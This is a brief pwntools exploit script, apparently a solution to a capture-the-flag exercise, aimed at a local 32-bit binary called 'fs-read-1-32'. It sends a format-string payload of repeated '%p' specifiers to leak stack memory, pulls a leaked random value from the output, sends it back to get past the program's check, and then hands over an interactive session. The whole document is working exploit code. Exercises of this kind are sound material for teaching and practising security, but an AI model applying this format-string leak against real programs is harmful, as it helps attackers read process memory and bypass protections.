from pwn import *

# Launch processs
p = process('./fs-read-1-32')

# Read rand
print(p.recvline())
p.sendline('%p%p%p%p%p%p')

# Parse rand
data = p.recvline()
data = data[len(data)-9:]
print(data)

# Send rand
p.sendline(data)
p.interactive()
